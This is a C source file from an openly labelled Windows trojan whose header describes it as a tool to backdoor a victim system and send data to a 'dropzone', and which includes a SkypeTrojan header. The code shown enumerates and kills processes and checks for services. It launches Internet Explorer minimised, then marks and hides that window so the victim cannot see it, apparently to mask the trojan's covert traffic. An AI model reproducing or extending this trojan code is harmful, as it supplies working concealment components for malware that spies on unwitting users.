#pragma once
/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */







 /*
  * Tool name   :
  * Description : Tool to backdoor a MS Windows victim system and sending back
  *               data packages to the dropzone.
  * Version     : 0.2
  * Author      : Ruben Unteregger
  * Web page    : http://www.megapanzer.com
  * Todo        :
  * Changes     :
  *
  */




#include <stdio.h>
#include <io.h>
#include <windows.h>
#include <tchar.h>
#include <Psapi.h>
#include <process.h>
#include <tlhelp32.h>
#include <shlwapi.h>

#include "SkypeTrojan.h"
#include "Processes.h"
#include "GeneralFunctions.h"

extern char* gBaseDirectory;
extern int gPID;
extern int gHidden;
extern HWND gCurrentForegroundWindow;





/*
 * List running processes.
 *
 */

int killProcessByName(char* pProcessNamePattern)
{
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    int mCounter = 0;
    int mRetVal = 0;


    if (pProcessNamePattern == NULL)
    {
        mRetVal = 1;
        goto END;
    }

    if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
    {
        mRetVal = 2;
        goto END;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    lowerToUpperCase(pProcessNamePattern);


    /*
     * Retrieve information about the first process and exit if unsuccessful
     *
     */

    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        mRetVal = 3;
        goto END;
    }


    /*
     * Walk the snapshot of processes.
     *
     */

    do
    {
        lowerToUpperCase(pe32.szExeFile);

        if (strstr(pe32.szExeFile, pProcessNamePattern) != NULL)
        {
            if (GetCurrentProcessId() != pe32.th32ProcessID)
            {
                if ((hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID)) != NULL)
                {
                    TerminateProcess(hProcess, 0x00031);
                    CloseHandle(hProcess);
                }
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));


END:

    if (hProcessSnap != INVALID_HANDLE_VALUE)
        CloseHandle(hProcessSnap);

    return(mRetVal);
}







/*
 * Kill a processes child processes.
 *
 */

int killChildProcesses(DWORD pParentPID)
{
    HANDLE hOpenProcHandle;
    HANDLE hProcessSnap;
    PROCESSENTRY32 mPE32ProcessData;
    int mRetVal = 0;

    if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
    {
        mRetVal = 1;
        goto END;
    }

    mPE32ProcessData.dwSize = sizeof(PROCESSENTRY32);


    /*
     * Retrieve information about the first process,
     * and exit if not successful.
     */

    if (!Process32First(hProcessSnap, &mPE32ProcessData))
    {
        mRetVal = 2;
        goto END;
    }


    /*
     * Walk through the snapshot of processes, and
     * display information about each process.
     *
     */

    do
    {
        if (mPE32ProcessData.th32ParentProcessID == pParentPID)
        {
            if (!(hOpenProcHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pParentPID)))
                break;

            if (TerminateProcess(hOpenProcHandle, 0) == 0)
            {
                CloseHandle(hOpenProcHandle);
                break;
            }
            CloseHandle(hOpenProcHandle);
        }
    } while (Process32Next(hProcessSnap, &mPE32ProcessData));

END:

    CloseHandle(hProcessSnap);
    return(mRetVal);
}



/*
 * Determine process ID for wanted application.
 *
 */

DWORD getProcessID(char* pProcessName, char* pProcessPath, int pProcessPathLength)
{
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    char mTemp[MAX_BUF_SIZE + 1];
    char mTemp2[MAX_BUF_SIZE + 1];
    char mBinaryName[MAX_BUF_SIZE + 1];
    HMODULE hMods[1024];
    DWORD cbNeeded;
    int mCounter = 0;
    int mRetVal = 1;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return(-1);

    pe32.dwSize = sizeof(PROCESSENTRY32);


    if (pProcessName != NULL)
        lowerToUpperCase(pProcessName);



    /*
     * Retrieve information about the first process
     * and exit if not successful.
     *
     */

    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return(-2);
    }


    /*
     * Walk through the snapshot of processes, and
     * display information about each process.
     *
     */

    do
    {
        ZeroMemory(mTemp, sizeof(mTemp));
        ZeroMemory(mTemp2, sizeof(mTemp2));

        if (pProcessName != NULL)
            lowerToUpperCase(pe32.szExeFile);

        if (pProcessName != NULL)
            snprintf(mTemp, sizeof(mTemp) - 1, "proc : %5d - %s", pe32.th32ProcessID, pe32.szExeFile);
        else
            snprintf(mTemp, sizeof(mTemp) - 1, "%8d - %s", pe32.th32ProcessID, pe32.szExeFile);


        if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
        {
            if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
            {
                // Get the full path to the binary.
                if (GetModuleFileNameEx(hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
                {
                    // Print the module name and handle value.
                    if (pProcessName != NULL)
                        lowerToUpperCase(mBinaryName);

                    snprintf(mTemp2, sizeof(mTemp2) - 1, "%s", mBinaryName);
                }
            }
            CloseHandle(hProcess);
        }


        if (pProcessName != NULL && (strstr(mTemp, pProcessName) != NULL || strstr(mTemp2, pProcessName) != NULL))
        {
            mRetVal = pe32.th32ProcessID;
            strncpy(pProcessPath, mTemp2, pProcessPathLength);
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return(mRetVal);
}





/*
 * Start IE and/or hide it if necessary.
 *
 */

void runIE(char* pIEPath)
{
    char mTemp[MAX_BUF_SIZE + 1];
    int mCounter = 0;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(mTemp, sizeof(mTemp));
    snprintf(mTemp, sizeof(mTemp) - 1, "%s", IEXPLORE_PATTERN);


    /*
     * If no IE is running, start a new instance.
     *
     */

    if (processExists(mTemp, NULL) != 0)
    {

        /*
         * Remember which window was set to the foreground.
         *
         */

        gCurrentForegroundWindow = NULL;
        if (!(gCurrentForegroundWindow = GetForegroundWindow()))
            gCurrentForegroundWindow = NULL;

        ZeroMemory(mTemp, sizeof(mTemp));
        snprintf(mTemp, sizeof(mTemp) - 1, "%s -nohome", pIEPath);

        ZeroMemory(&pi, sizeof(pi));
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOWMINNOACTIVE;


        if (CreateProcess(NULL, mTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            if (gCurrentForegroundWindow != NULL)
                SetForegroundWindow(gCurrentForegroundWindow);

            /*
             * Locate the new IE instance and if not yet marked with the
             * "_SILENZIO" stamp do so and hide it!
             *
             */

            gPID = pi.dwProcessId;
            gHidden = 1;

            for (mCounter = 0; mCounter < 1000 && gHidden != 0; mCounter++)
            {
                EnumWindows((WNDENUMPROC)EnumWindowsProcMarker, 0);
                EnumWindows((WNDENUMPROC)EnumWindowsProcHider, 0);
                Sleep(10);
            } // for (mCounter = 0; mCounter < 1000, mCounter++)
        } // CreateProcess(NULL, mTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))


        if (gCurrentForegroundWindow != NULL)
            SetForegroundWindow(gCurrentForegroundWindow);


        /*
         * If there's already a running instance of it, check if its one of
         * ours (marked with _SILENZIO) and hide it, if necessary.
         *
         */

    }
    else {
        EnumWindows((WNDENUMPROC)EnumWindowsProcHider, 0);
    } // if (processExists2(mTemp) != 0)   
}






/*
 * Window enumeration callback function. locate the iexplore.exe window and mark it.
 *
 */

BOOL CALLBACK EnumWindowsProcMarker(HWND hWnd, LPARAM lParam)
{
    char mTemp[MAX_BUF_SIZE + 1];
    char mTemp2[MAX_BUF_SIZE + 1];
    char winText[MAX_BUF_SIZE];
    DWORD mPID = 0;
    HANDLE hCurrProcHandle;
    HMODULE hMod;
    DWORD cbNeeded;
    int i = 0;


    ZeroMemory(winText, sizeof(winText) - 1);
    if (GetWindowTextLength(hWnd))
    {
        GetWindowText(hWnd, winText, sizeof(winText) - 1);
        GetWindowThreadProcessId(hWnd, &mPID);

        if (mPID == (unsigned long)gPID)
        {
            if ((hCurrProcHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, mPID)) != NULL)
            {
                if (EnumProcessModules(hCurrProcHandle, &hMod, sizeof(hMod), &cbNeeded))
                {
                    ZeroMemory(mTemp2, sizeof(mTemp2));
                    GetWindowText(hWnd, mTemp2, sizeof(mTemp2) - 1);

                    if (strstr(mTemp2, gBaseDirectory) == NULL)
                    {
                        ZeroMemory(mTemp, sizeof(mTemp));
                        snprintf(mTemp, sizeof(mTemp) - 1, "%s %s", gBaseDirectory, mTemp2);
                        SetWindowText(hWnd, mTemp);
                        ZeroMemory(mTemp2, sizeof(mTemp2));
                        GetWindowText(hWnd, mTemp2, sizeof(mTemp2) - 1);
                    }

                    ZeroMemory(mTemp, sizeof(mTemp));
                    GetModuleBaseName(hCurrProcHandle, hMod, winText, sizeof(winText));
                    lowerToUpperCase(winText);
                    strncpy(mTemp, winText, sizeof(mTemp) - 1);
                }
                CloseHandle(hCurrProcHandle);
            }
        }
    }

    return(1);
}




/*
 * Window enumeration callback function. locate the iexplore.exe window and hide it.
 *
 */

BOOL CALLBACK EnumWindowsProcHider(HWND hWnd, LPARAM lParam)
{
    char mTemp[MAX_BUF_SIZE + 1];
    char winText[MAX_BUF_SIZE];
    DWORD mPID = 0;
    HANDLE hCurrProcHandle;
    HMODULE hMod;
    DWORD cbNeeded;

    ZeroMemory(winText, sizeof(winText) - 1);
    if (GetWindowTextLength(hWnd))
    {
        GetWindowText(hWnd, winText, sizeof(winText) - 1);
        GetWindowThreadProcessId(hWnd, &mPID);

        if (mPID == (unsigned long)gPID)
        {
            if ((hCurrProcHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, mPID)) != NULL)
            {
                if (EnumProcessModules(hCurrProcHandle, &hMod, sizeof(hMod), &cbNeeded))
                {
                    ZeroMemory(mTemp, sizeof(mTemp));
                    GetWindowText(hWnd, mTemp, sizeof(mTemp) - 1);

                    if (strstr(mTemp, gBaseDirectory) != NULL && IsWindowVisible(hWnd))
                    {
                        ShowWindow(hWnd, SW_HIDE);
                        UpdateWindow(hWnd);
                        Sleep(50);
                        SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
                        Sleep(50);
                        ShowWindow(hWnd, SW_HIDE);
                        UpdateWindow(hWnd);
                        gHidden = 0;
                    }
                }
                CloseHandle(hCurrProcHandle);
            }
        }
    }
    return(1);
}




/*
 * Find a process by its name.
 *
 */

int processExists(char* pProcessName, int* pPID)
{
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    char mTemp[MAX_BUF_SIZE + 1];
    char mTemp2[MAX_BUF_SIZE + 1];
    char mBinaryName[MAX_BUF_SIZE + 1];
    HMODULE hMods[1024];
    DWORD cbNeeded;
    int mCounter = 0;
    int mRetVal = 1;

    if (pProcessName == NULL)
        return(-1);

    if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
        return(-2);

    pe32.dwSize = sizeof(PROCESSENTRY32);



    /*
     * Retrieve information about the first process,
     * and exit if unsuccessful.
     *
     */

    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return(-3);
    }


    /*
     * Now walk the snapshot of processes, and
     * display information about each process in turn.
     *
     */


    do
    {
        ZeroMemory(mTemp, sizeof(mTemp));
        ZeroMemory(mTemp2, sizeof(mTemp2));

        if (pProcessName != NULL)
            lowerToUpperCase(pe32.szExeFile);

        if (pProcessName != NULL)
            snprintf(mTemp, sizeof(mTemp) - 1, "%s", pe32.szExeFile);
        else
            snprintf(mTemp, sizeof(mTemp) - 1, "%s", pe32.szExeFile);


        /*
         * Determine full path process binary name.
         *
         */

        if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
        {
            if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
            {
                if (GetModuleFileNameEx(hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
                {
                    if (pProcessName != NULL)
                        lowerToUpperCase(mBinaryName);

                    snprintf(mTemp2, sizeof(mTemp2) - 1, "%s", mBinaryName);
                }
            }
            CloseHandle(hProcess);
        }

        if (pProcessName != NULL && (strstr(mTemp, pProcessName) != NULL || strstr(mTemp2, pProcessName) != NULL))
        {
            if (pPID != NULL)
                *pPID = pe32.th32ProcessID;

            mRetVal = 0;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));


    CloseHandle(hProcessSnap);

    if (mRetVal != 0)
        gHidden = 1;

    return(mRetVal);
}









/*
 * Find a process by PID.
 *
 */

int PIDExists(int pPid)
{
    HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe32;
    int mCounter = 0;
    int mRetVal = 1;

    if (pPid < 0)
    {
        mRetVal = -1;
        goto END;
    }

    if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
    {
        mRetVal = -2;
        goto END;
    }


    pe32.dwSize = sizeof(PROCESSENTRY32);


    /*
     * Retrieve information about the first process and exit if unsuccessful
     *
     */

    if (!Process32First(hProcessSnap, &pe32))
    {
        mRetVal = -3;
        goto END;
    }


    /*
     * Now walk the snapshot of processes, and display information about each process in turn
     *
     */

    do
    {
        mRetVal = 24;
        if ((unsigned int)pPid == pe32.th32ProcessID)
        {
            mRetVal = 0;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

END:

    if (hProcessSnap != INVALID_HANDLE_VALUE)
        CloseHandle(hProcessSnap);

    if (hProcess != INVALID_HANDLE_VALUE)
        CloseHandle(hProcess);

    return(mRetVal);
}






/*
 * Kill all processes started in our home directory but dont touch our own process
 *
 */

int killOurProcesses(char* pBaseDirectory)
{
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    char mTemp[MAX_BUF_SIZE + 1];
    char mTemp2[MAX_BUF_SIZE + 1];
    char mBinaryName[MAX_BUF_SIZE + 1];
    HMODULE hMods[1024];
    DWORD cbNeeded;
    int mCounter = 0;
    int mRetVal = 0;


    if (pBaseDirectory == NULL || pBaseDirectory[0] == '\0')
    {
        mRetVal = 1;
        goto END;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
    {
        mRetVal = 2;
        goto END;
    }


    if (!Process32First(hProcessSnap, &pe32))
    {
        if (!Process32Next(hProcessSnap, &pe32))
        {
            CloseHandle(hProcessSnap);     // Must clean up the snapshot object!
            mRetVal = 3;
            goto END;
        }
    }


    do
    {
        ZeroMemory(mTemp, sizeof(mTemp));
        ZeroMemory(mTemp2, sizeof(mTemp2));

        if (pe32.th32ProcessID != GetCurrentProcessId() && (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
            if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
                if (GetModuleFileNameEx(hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
                    if (StrStrI(mBinaryName, pBaseDirectory))
                        TerminateProcess(hProcess, 0);

    } while (Process32Next(hProcessSnap, &pe32));




END:

    if (hProcessSnap != INVALID_HANDLE_VALUE)
        CloseHandle(hProcessSnap);

    return(mRetVal);
}






/*
 * Find a service by name.
 *
 */

int serviceExists(char* pServicePattern)
{
    SC_HANDLE mSCM;
    ENUM_SERVICE_STATUS_PROCESS* mNextService;
    DWORD mBufferSize = 0;
    DWORD mCounter = 0;
    DWORD mResume = 0;
    DWORD i = 0;
    char* mBuffer, * mServiceName;
    char mTemp[MAX_BUF_SIZE + 1];
    char mServicePattern[MAX_BUF_SIZE + 1];
    int mRetVal = 1;

    mSCM = OpenSCManager(NULL, NULL, GENERIC_READ);
    mBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mBufferSize);

    ZeroMemory(mBuffer, mBufferSize);
    EnumServicesStatusEx(mSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_ACTIVE, (unsigned char*)mBuffer, mBufferSize, &mBufferSize, &mCounter, &mResume, NULL);


    ZeroMemory(mServicePattern, sizeof(mServicePattern));
    strncpy(mServicePattern, pServicePattern, sizeof(mServicePattern) - 1);
    lowerToUpperCase(mServicePattern);

    for (i = 0; i < mCounter; i++)
    {
        mNextService = ((ENUM_SERVICE_STATUS_PROCESS*)mBuffer) + i;
        mServiceName = _strlwr(strdup(mNextService->lpServiceName));

        ZeroMemory(mTemp, sizeof(mTemp));
        strncpy(mTemp, mServiceName, sizeof(mTemp) - 1);
        lowerToUpperCase(mTemp);


        /*
         * Check if service exists.
         *
         */

        if (strstr(mTemp, mServicePattern) != NULL)
        {
            mRetVal = 0;
            goto END;
        }
    }

END:

    CloseServiceHandle(mSCM);

    if (mBuffer != NULL)
    {
        HeapFree(GetProcessHeap(), 0, mBuffer);
        mBuffer = NULL;
    }

    return(mRetVal);
}
